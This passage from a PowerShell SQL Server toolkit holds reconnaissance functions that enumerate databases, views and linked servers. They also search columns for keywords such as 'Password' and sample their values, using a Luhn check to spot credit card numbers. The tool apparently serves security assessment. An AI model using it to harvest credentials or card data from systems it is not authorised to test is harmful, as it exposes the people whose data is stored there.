
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by exact column name.')]
        [string]$ColumnName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
        [string]$ColumnNameSearch,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblColumns = New-Object -TypeName System.Data.DataTable

        # Setup table filter
        if($TableName)
        {
            $TableNameFilter = " and TABLE_NAME like '%$TableName%'"
        }
        else
        {
            $TableNameFilter = ''
        }

        # Setup column filter
        if($ColumnName)
        {
            $ColumnFilter = " and column_name like '$ColumnName'"
        }
        else
        {
            $ColumnFilter = ''
        }

        # Setup column filter
        if($ColumnNameSearch)
        {
            $ColumnSearchFilter = " and column_name like '%$ColumnNameSearch%'"
        }
        else
        {
            $ColumnSearchFilter = ''
        }

        # Setup column search filter
        if($ColumnNameSearch)
        {
            $Keywords = $ColumnNameSearch.split(',')

            [int]$i = $Keywords.Count
            while ($i -gt 0)
            {
                $i = $i - 1
                $Keyword = $Keywords[$i]

                if($i -eq ($Keywords.Count -1))
                {
                    $ColumnSearchFilter = "and column_name like '%$Keyword%'"
                }
                else
                {
                    $ColumnSearchFilter = $ColumnSearchFilter + " or column_name like '%$Keyword%'"
                }
            }
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                COLUMN_NAME as [ColumnName],
                DATA_TYPE as [ColumnDataType],
                CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
                FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                $ColumnSearchFilter
                $ColumnFilter
                $TableNameFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results
            $TblColumns = $TblColumns + $TblResults
        }
    }

    End
    {
        # Return data
        $TblColumns
    }
}


Function Get-SQLColumnSampleData
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Database')
        $null = $TblData.Columns.Add('Schema')
        $null = $TblData.Columns.Add('Table')
        $null = $TblData.Columns.Add('Column')
        $null = $TblData.Columns.Add('Sample')
        $null = $TblData.Columns.Add('RowCount')

        if($ValidateCC)
        {
            $null = $TblData.Columns.Add('IsCC')
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : CONNECTION FAILED"
            }
            Return
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                Write-Verbose -Message "$Instance : - Connection Success."
                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
            }

            if($NoDefaults)
            {
                # Search for columns
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
            }else
            {
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
            }
        }

        # Check if columns were found
        if($Columns)
        {
            # List columns found
            $Columns|
            ForEach-Object -Process {
                $sDatabaseName = $_.DatabaseName
                $sSchemaName = $_.SchemaName
                $sTableName = $_.TableName
                $sColumnName = $_.ColumnName
                $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"

                # Status user
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                    Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                }

                # Get row count for column matches
                $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows

                # Get sample data
                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                Select-Object -ExpandProperty $sColumnName |
                ForEach-Object -Process {
                    if($ValidateCC)
                    {
                        # Check if value is CC
                        $Value = 0
                        if([uint64]::TryParse($_,[ref]$Value))
                        {
                            $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }
                        else
                        {
                            $LuhnCheck = 'False'
                        }

                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                    }
                    else
                    {
                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                    }
                }
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - No columns were found that matched the search."
            }
        }

        # Status User
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
        }
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Get-SQLColumnSampleDataThreaded
{
    <#
            .SYNOPSIS
            Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER $NoOutput
            Don't output any sample data.
            .PARAMETER SampleSize
            Number of records to sample.
            .PARAMETER Keywords
            Comma seperated list of keywords to search for.
            .PARAMETER DatabaseName
            Database to filter on.
            .PARAMETER NoDefaults
            Don't show columns from default databases.
            .PARAMETER ValidateCC
            Use Luhn formula to check if sample is a valid credit card.

            .PARAMETER Threads
            Number of concurrent host threads.
            .EXAMPLE
            PS C:\> Get-SQLColumnSampleDataThreaded -verbose -Instance SQLServer1\STANDARDDEV2014 -Keywords "account,credit,card" -SampleSize 5 -ValidateCC | ft -AutoSize
            VERBOSE: SQLServer1\STANDARDDEV2014 : START SEARCH DATA BY COLUMN
            VERBOSE: SQLServer1\STANDARDDEV2014 : CONNECTION SUCCESS
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Searching for column names that match criteria...
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Column match: [testdb].[dbo].[tracking].[card]
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
            VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN

            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleDataThreaded -Keywords "account,credit,card" -SampleSize 5 -ValidateCC -Threads 10
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Database')
        $null = $TblData.Columns.Add('Schema')
        $null = $TblData.Columns.Add('Table')
        $null = $TblData.Columns.Add('Column')
        $null = $TblData.Columns.Add('Sample')
        $null = $TblData.Columns.Add('RowCount')

        if($ValidateCC)
        {
            $null = $TblData.Columns.Add('IsCC')
        }

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Set instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Test connection to server
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if(-not $TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : CONNECTION FAILED"
                }
                Return
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                    Write-Verbose -Message "$Instance : - Connection Success."
                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
                }

                if($NoDefaults)
                {
                    # Search for columns
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
                }else
                {
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
                }
            }

            # Check if columns were found
            if($Columns)
            {
                # List columns found
                $Columns|
                ForEach-Object -Process {
                    $sDatabaseName = $_.DatabaseName
                    $sSchemaName = $_.SchemaName
                    $sTableName = $_.TableName
                    $sColumnName = $_.ColumnName
                    $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                    $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                    $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                    $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"

                    # Status user
                    if( -not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                        Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                    }

                    # Get row count for column matches
                    $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows

                    # Get sample data
                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                    Select-Object -ExpandProperty $sColumnName |
                    ForEach-Object -Process {
                        if($ValidateCC)
                        {
                            # Check if value is CC
                            $Value = 0
                            if([uint64]::TryParse($_,[ref]$Value))
                            {
                                $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                            }
                            else
                            {
                                $LuhnCheck = 'False'
                            }

                            # Add record
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                        }
                        else
                        {
                            # Add record
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                        }
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - No columns were found that matched the search."
                }
            }

            # Status User
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblData
    }
}


Function  Get-SQLDatabaseSchema
{
    <#
            .SYNOPSIS
            Returns schema information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER SchemaName
            Schema name to filter for.
            .PARAMETER NoDefaults
            Only show information for non default databases.

            .EXAMPLE
            PS C:\> Get-SQLDatabaseSchema -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : db_accessadmin
            SchemaOwner  : db_accessadmin
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseSchema -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Schema name.')]
        [string]$SchemaName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSchemas = New-Object -TypeName System.Data.DataTable

        # Setup schema filter
        if($SchemaName)
        {
            $SchemaNameFilter = " where schema_name like '%$SchemaName%'"
        }
        else
        {
            $SchemaNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing Schemas from the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                CATALOG_NAME as [DatabaseName],
                SCHEMA_NAME as [SchemaName],
                SCHEMA_OWNER as [SchemaOwner]
                FROM    [$DbName].[INFORMATION_SCHEMA].[SCHEMATA]
                $SchemaNameFilter
            ORDER BY SCHEMA_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results
            $TblSchemas = $TblSchemas + $TblResults
        }
    }

    End
    {
        # Return data
        $TblSchemas
    }
}


Function  Get-SQLView
{
    <#
            .SYNOPSIS
            Returns view information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER ViewName
            View name to filter for.
            .PARAMETER NoDefaults
            Only display results from non default databases.
            .EXAMPLE
            PS C:\> Get-SQLView -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master

            ComputerName   : SQLServer1
            Instance       : SQLServer1\STANDARDDEV2014
            DatabaseName   : master
            SchemaName     : dbo
            ViewName       : spt_values
            ViewDefinition :
            create view spt_values as
            select name collate database_default as name,
            number,
            type collate database_default as type,
            low, high, status
            from sys.spt_values
            IsUpdatable    : NO
            CheckOption    : NONE
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLView -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'View name.')]
        [string]$ViewName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblViews = New-Object -TypeName System.Data.DataTable

        # Setup View filter
        if($ViewName)
        {
            $ViewFilter = " where table_name like '%$ViewName%'"
        }
        else
        {
            $ViewFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing views from the databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG as [DatabaseName],
                TABLE_SCHEMA as [SchemaName],
                TABLE_NAME as [ViewName],
                VIEW_DEFINITION as [ViewDefinition],
                IS_UPDATABLE as [IsUpdatable],
                CHECK_OPTION as [CheckOption]
                FROM    [INFORMATION_SCHEMA].[VIEWS]
                $ViewFilter
            ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblViews = $TblViews + $TblResults
        }
    }

    End
    {
        # Return data
        $TblViews
    }
}

Function  Get-SQLServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server link name.')]
        [string]$DatabaseLinkName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerLinks = New-Object -TypeName System.Data.DataTable

        # Setup DatabaseLinkName filter
        if($DatabaseLinkName)
        {
            $VDatabaseLinkNameFilter = " WHERE a.name like '$DatabaseLinkName'"
        }
        else
        {
            $DatabaseLinkNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.server_id as [DatabaseLinkId],
            a.name AS [DatabaseLinkName],
            CASE a.Server_id
            WHEN 0
            THEN 'Local'
            ELSE 'Remote'
            END AS [DatabaseLinkLocation],
            a.product as [Product],
            a.provider as [Provider],
            a.catalog as [Catalog],
            'LocalLogin' = CASE b.uses_self_credential
            WHEN 1 THEN 'Uses Self Credentials'
            ELSE c.name
            END,
            b.remote_name AS [RemoteLoginName],
            a.is_rpc_out_enabled,
            a.is_data_access_enabled,
            a.modify_date
            FROM [Master].[sys].[Servers] a
            LEFT JOIN [Master].[sys].[linked_logins] b
            ON a.server_id = b.server_id
            LEFT JOIN [Master].[sys].[server_principals] c
            ON c.principal_id = b.local_principal_id
        $DatabaseLinkNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblServerLinks = $TblServerLinks + $TblResults
    }

    End
    {
        # Return data
        $TblServerLinks
    }
}

Function  Get-SQLServerConfiguration
{
    <#
            .SYNOPSIS
            Returns configuration information from the server using sp_configure.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
